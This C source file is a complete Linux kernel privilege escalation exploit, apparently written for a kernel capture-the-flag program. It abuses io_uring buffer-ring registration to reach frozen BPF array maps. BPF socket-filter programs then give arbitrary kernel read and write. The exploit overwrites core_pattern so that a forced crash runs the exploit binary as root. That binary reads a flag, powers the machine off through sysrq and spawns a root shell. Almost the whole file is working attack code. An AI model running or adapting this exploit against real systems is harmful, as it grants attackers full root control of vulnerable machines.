	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_4),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, 0x40),
	BPF_LDX_MEM(BPF_B, BPF_REG_4, BPF_REG_5, 0x16),
	BPF_ALU64_REG(BPF_ADD, BPF_REG_4, BPF_REG_6),

	BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0xCAFE),
	BPF_ST_MEM(BPF_DW, BPF_REG_10, -16, 0xBACA),

	BPF_MOV64_REG(BPF_REG_5, BPF_REG_10),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_5, -8),
	BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_5, -32),

	BPF_ALU64_IMM(BPF_MUL, BPF_REG_4, 8),

	BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),
	BPF_MOV64_IMM(BPF_REG_2, 0),
	BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -40),
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_4, 8),
	BPF_MOV64_IMM(BPF_REG_5, 1),
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

	BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_10, -32),
	BPF_LD_MAP_FD(BPF_REG_9, 0x101),
	BPF_MAP_GET(1, BPF_REG_7),
	BPF_MAP_GET_ADDR(2, BPF_REG_6),

	BPF_JMP_IMM(BPF_JNE, BPF_REG_7, 0, 4),

	BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_8, 0),
	BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_5, 0),
	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),

	BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_6, 0),
	BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_5, 0),
	BPF_MOV64_IMM(BPF_REG_0, 0),
	BPF_EXIT_INSN(),

};

int bpf(int cmd, void *attr, size_t n)
{
	asm volatile("syscall" ::"a"(SYS_bpf));
}

int bpf_create_map(enum bpf_map_type map_type, unsigned int key_size,
				   unsigned int value_size, unsigned int max_entries,
				   unsigned int map_fd)
{
	union bpf_attr attr = {.map_type = map_type,
						   .key_size = key_size,
						   .value_size = value_size,
						   .max_entries = max_entries,
						   .inner_map_fd = map_fd};

	return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_create_mmap(enum bpf_map_type map_type, unsigned int key_size,
					unsigned int value_size, unsigned int max_entries,
					unsigned int map_fd)
{
	union bpf_attr attr = {.map_type = map_type,
						   .key_size = key_size,
						   .value_size = value_size,
						   .max_entries = max_entries,
						   .inner_map_fd = map_fd,
						   .map_flags = BPF_F_MMAPABLE | BPF_F_RDONLY_PROG};

	return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

int bpf_prog_load(enum bpf_prog_type type, const struct bpf_insn *insns,
				  int insn_cnt, const char *license)
{
	union bpf_attr attr = {
		.prog_type = type,
		.prog_flags = BPF_F_TEST_RND_HI32,
		.insns = ptr_to_u64(insns),
		.insn_cnt = insn_cnt,
		.license = ptr_to_u64(license),
		.log_buf = (size_t)log_buf,
		.log_size = 0x10000,
		.log_level = 3,
	};

	return bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_lookup_elem(int fd, const void *key, void *value)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
	};

	return SYSCHK(
		syscall(__NR_BPF, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr)));
}

int bpf_update_elem(int fd, const void *key, const void *value, uint64_t flags)
{
	union bpf_attr attr = {
		.map_fd = fd,
		.key = ptr_to_u64(key),
		.value = ptr_to_u64(value),
		.flags = flags,
	};

	return SYSCHK(
		syscall(__NR_BPF, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr)));
}

int bpf_map_frezze(int fd)
{
	union bpf_attr attr = {
		.map_fd = fd,

	};

	return SYSCHK(
		syscall(__NR_BPF, BPF_MAP_FREEZE, &attr, sizeof(attr)));
}

int update_elem(int mapfd, int key, size_t val)
{
	return bpf_update_elem(mapfd, &key, &val, 0);
}

size_t get_elem(int mapfd, int key)
{
	size_t val;
	bpf_lookup_elem(mapfd, &key, &val);
	return val;
}

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

int sockets[2];

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

int load_array_map_leak_prog()
{
	char license[] = "GPL";
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, array_map_leak_prog,
						 sizeof(array_map_leak_prog) / sizeof(struct bpf_insn), license);
}

int load_kernel_read_write_prog()
{
	char license[] = "GPL";
	return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, kernel_read_write_prog,
						 sizeof(kernel_read_write_prog) / sizeof(struct bpf_insn), license);
}

size_t kernel_read64(size_t addr)
{
	update_elem(0x101, 1, 0);
	*(size_t *)(&buf[8]) = addr;
	write(sockets[0], buf, 0x10);
	return get_elem(0x101, 2);
}
size_t kernel_write64(size_t addr, size_t val)
{
	update_elem(0x101, 1, 1);
	update_elem(0x101, 2, val);
	*(size_t *)(&buf[8]) = addr;
	write(sockets[0], buf, 0x10);
}

int main(int argc, char **argv)
{
	int cfd[2];

	setvbuf(stdout, 0, 2, 0);

	SYSCHK(dup2(0, 0x100));

	if (argc > 1)
	{
		// #define SYS_pidfd_getfd 438
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;echo o>/proc/sysrq-trigger");
		execlp("bash", "bash", NULL);
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(0);
		setsid();
		crash("");
	}
	int arraymap = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 0x10, 0);
	dup2(arraymap, 0x101);
	while (1)
	{
		if (fork() == 0)
			break;
		wait(0);
	}

	SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, cfd));
	struct io_uring_params params = {.flags = IORING_SETUP_TASKRUN_FLAG | IORING_SETUP_DEFER_TASKRUN | IORING_SETUP_SINGLE_ISSUER};
	int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, 0x2000, &params));
	unsigned char *sq_ring = SYSCHK(mmap(NULL, params.sq_off.array + params.sq_entries * sizeof(unsigned), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
	unsigned char *cq_ring = SYSCHK(mmap(NULL, params.cq_off.cqes + params.cq_entries * sizeof(struct io_uring_cqe), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
	struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, params.sq_entries * sizeof(struct io_uring_sqe), PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));
	unsigned int *cq_khead = (unsigned int *)(cq_ring + params.cq_off.head);
	int fd = socket(AF_UNIX, SOCK_STREAM, 0);
	char *res_buffer = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));
	struct io_uring_buf_ring *ring_buffer = SYSCHK(mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));
	size_t bls[0x1000];
	ring_buffer->bufs[0].addr = (size_t)res_buffer;
	ring_buffer->bufs[0].len = 0x1000;
	ring_buffer->tail = 1;
	struct io_uring_buf_reg reg_ring = {
		.ring_addr = (unsigned long)ring_buffer,
		.ring_entries = 1,
		.bgid = 1};

	for (int i = 0; i < 0x1000; i++)
	{
		reg_ring.bgid = i;
		SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_REGISTER_PBUF_RING, &reg_ring, 1));
		bls[i] = reg_ring.resv[0];
		reg_ring.resv[0] = 0;
	}

	sqes[0] = (struct io_uring_sqe){
		.opcode = IORING_OP_READ,
		.flags = IOSQE_BUFFER_SELECT,
		.fd = SYSCHK(socket(AF_UNIX, SOCK_STREAM, 0)),
		.addr = 0,
		.len = 0x1000,
		.buf_group = 0x800,
	};

	((int *)(sq_ring + params.sq_off.array))[0] = 0;
	(*(int *)(sq_ring + params.sq_off.tail)) += 0x1;
	SYSCHK(syscall(SYS_io_uring_enter, uring_fd, 0x1, 0, 0, NULL, 0));

	size_t *addr[0x100];
	for (int i = 0; i < 0x1000; i++)
	{
		reg_ring.bgid = i;
		SYSCHK(syscall(__NR_io_uring_register, uring_fd, IORING_UNREGISTER_PBUF_RING, &reg_ring, 1));
	}

	syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL, 0, -1);

	int bfd[0x100];
	int progfds[0x100][2];
	for (int i = 0; i < 0x100; i++)
	{
		bfd[i] = SYSCHK(bpf_create_mmap(BPF_MAP_TYPE_ARRAY, 4, 0x1000, 1, 0));
		bpf_map_frezze(bfd[i]);
		dup2(bfd[i], 0x100);
		progfds[i][0] = load_array_map_leak_prog();
		progfds[i][1] = load_kernel_read_write_prog();
	}

	SYSCHK(syscall(SYS_io_uring_enter, uring_fd, 0, 1, IORING_ENTER_GETEVENTS, NULL, 0));
	int exploit = 0;
	int progfd2;
	for (int j = 0; j < 0x100; j++)
	{
		char *addr = SYSCHK(mmap(0, 0x1000, PROT_READ, MAP_SHARED, bfd[j], 0));
		if (memcmp(addr, magic, 0x1000) != 0)
		{

			int progfd = progfds[j][0];
			progfd2 = progfds[j][1];

			socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
			setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd,
					   sizeof(progfd));

			exploit = 1;
			break;
		}
		munmap(addr, 0x1000);
	}

	if (exploit == 0)
		exit(0);

	size_t map_addr = 0;

LOOP:
	for (int i = 0; i < 0x100; i += 8)
	{
		buf[8] = i;
		write(sockets[0], buf, 9);
		map_addr = get_elem(0x101, 1);
		if (map_addr)
		{
			break;
		}
	}
	if (map_addr == 0)
		goto LOOP;

	socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets);
	setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd2,
			   sizeof(progfd2));

	size_t kbase = kernel_read64(map_addr) - array_map_ops;

	size_t core_pattern = kbase + core_pattern_off;
	char user_buf[] = "|/proc/%P/fd/666 %P";
	for (int i = 0; i < sizeof(user_buf); i += 8)
		kernel_write64(core_pattern + i, *(size_t *)(&user_buf[i]));

	while (1)
		sleep(10);
}
